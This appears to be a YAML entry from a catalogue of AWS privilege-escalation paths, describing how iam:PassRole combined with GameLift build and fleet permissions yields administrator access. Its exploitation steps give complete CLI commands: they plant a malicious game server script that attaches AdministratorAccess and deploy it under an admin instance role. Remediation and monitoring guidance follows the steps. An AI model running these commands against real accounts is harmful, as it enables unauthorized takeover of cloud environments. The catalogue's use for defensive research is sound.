id: gamelift-001
name: iam:PassRole + gamelift:CreateBuild + gamelift:CreateFleet
category: new-passrole
services:
  - iam
  - gamelift

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must be able to pass the target admin IAM instance role to the GameLift service
    - permission: gamelift:CreateBuild
      resourceConstraints: No resource constraints required
    - permission: gamelift:CreateFleet
      resourceConstraints: No resource constraints required
    - permission: gamelift:RequestUploadCredentials
      resourceConstraints: Required to get temporary S3 credentials for uploading the build binary to GameLift's managed S3 location
  additional:
    - permission: gamelift:DescribeBuild
      resourceConstraints: Useful for polling build status until it reaches READY
    - permission: gamelift:DescribeFleetAttributes
      resourceConstraints: Useful for monitoring fleet provisioning status
    - permission: gamelift:ListFleets
      resourceConstraints: Helpful for discovering existing fleets
    - permission: gamelift:DescribeInstances
      resourceConstraints: Useful for confirming instance provisioning
    - permission: gamelift:GetComputeAccess
      resourceConstraints: Useful for accessing fleet instances to verify execution
    - permission: iam:ListAttachedUserPolicies
      resourceConstraints: Useful for verifying privilege escalation success

description: A principal with `iam:PassRole`, `gamelift:CreateBuild`, `gamelift:CreateFleet`, and `gamelift:RequestUploadCredentials` can escalate privileges by uploading a malicious game server binary as a GameLift build, then creating a fleet with an admin IAM instance role. The game server process runs on the fleet's EC2 instances with the `SHARED_CREDENTIAL_FILE` instance role credentials provider, giving it access to the admin role credentials. The server script calls `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user.

prerequisites:
  admin:
    - A role must exist that can be used as an EC2 instance role (trusts ec2.amazonaws.com)
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
    - A role must exist that can be used as an EC2 instance role and has elevated permissions

exploitationSteps:
  awscli:
    - step: 1
      command: |
        mkdir -p /tmp/gameserver-build
        cat > /tmp/gameserver-build/gameserver.sh << 'EOF'
        #!/bin/bash
        # Wait for SHARED_CREDENTIAL_FILE credentials to be available
        sleep 10
        # Use the instance role credentials to escalate privileges
        aws iam attach-user-policy \
          --user-name STARTING_USER \
          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
        echo "Privilege escalation complete"
        # Keep running so the fleet doesn't immediately terminate
        while true; do sleep 60; done
        EOF
        chmod +x /tmp/gameserver-build/gameserver.sh
      description: Create a malicious game server script that uses the fleet instance role's credentials (provided via SHARED_CREDENTIAL_FILE) to call iam:AttachUserPolicy and escalate privileges.
    - step: 2
      command: |
        BUILD_OUTPUT=$(aws gamelift create-build \
          --name privesc-build \
          --operating-system AMAZON_LINUX_2023 \
          --server-sdk-version 5.2.0 \
          --build-version 1.0.0)

        BUILD_ID=$(echo $BUILD_OUTPUT | jq -r '.Build.BuildId')

        UPLOAD_CREDS=$(aws gamelift request-upload-credentials \
          --build-id $BUILD_ID)

        # Upload the build to GameLift's S3 location using the temporary upload credentials
        S3_BUCKET=$(echo $UPLOAD_CREDS | jq -r '.StorageLocation.Bucket')
        S3_KEY=$(echo $UPLOAD_CREDS | jq -r '.StorageLocation.Key')
        ACCESS_KEY=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.AccessKeyId')
        SECRET_KEY=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.SecretAccessKey')
        SESSION_TOKEN=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.SessionToken')

        AWS_ACCESS_KEY_ID=$ACCESS_KEY \
        AWS_SECRET_ACCESS_KEY=$SECRET_KEY \
        AWS_SESSION_TOKEN=$SESSION_TOKEN \
        aws s3 cp /tmp/gameserver-build/ s3://$S3_BUCKET/$S3_KEY \
          --recursive
      description: Create a GameLift build record, get temporary upload credentials via gamelift:RequestUploadCredentials, and upload the malicious game server binary to GameLift's managed S3 bucket.
    - step: 3
      command: |
        aws gamelift describe-build \
          --build-id BUILD_ID \
          --query 'Build.Status' \
          --output text
      description: Poll build status until it reaches READY, indicating the binary has been validated and is ready for fleet deployment.
    - step: 4
      command: |
        aws gamelift create-fleet \
          --name privesc-fleet \
          --build-id BUILD_ID \
          --compute-type EC2 \
          --ec2-instance-type c5.large \
          --fleet-type ON_DEMAND \
          --instance-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
          --instance-role-credentials-provider SHARED_CREDENTIAL_FILE \
          --runtime-configuration '{
            "ServerProcesses": [{
              "LaunchPath": "/local/game/gameserver.sh",
              "ConcurrentExecutions": 1
            }]
          }'
      description: Create a GameLift fleet with the admin IAM instance role, using SHARED_CREDENTIAL_FILE to make the role credentials available to the game server process. The server starts automatically and escalates privileges.

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative GameLift fleet instance roles** - Game server fleets rarely need administrative IAM access. Scope instance roles to only the DynamoDB tables, S3 buckets, and services required for the game server.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificGameLiftRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "gamelift.amazonaws.com"
      }
    }
  }
  ```

  - **Restrict `gamelift:RequestUploadCredentials`** - This permission is required to upload builds but also enables the full attack chain. Restrict it alongside CreateBuild and CreateFleet.
  - Monitor CloudTrail for unusual GameLift fleet creation followed by IAM policy attachment events
  - Monitor CloudTrail for fleet creation by principals who do not usually manage GameLift fleets
  - Monitor CloudTrail for roles being passed to GameLift that haven't been used before
  - Alert on IAM policy attachment events originating from GameLift fleet instances
  - Regularly audit GameLift fleet instance roles for excessive IAM permissions

limitations: |
  This path provides administrative access only if the passed instance role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). GameLift fleet provisioning typically takes 5-15 minutes, making this a slower escalation path.

discoveryAttribution:
  firstDocumented:
    author: Seth Art
    organization: Datadog
    date: "2025"

references:
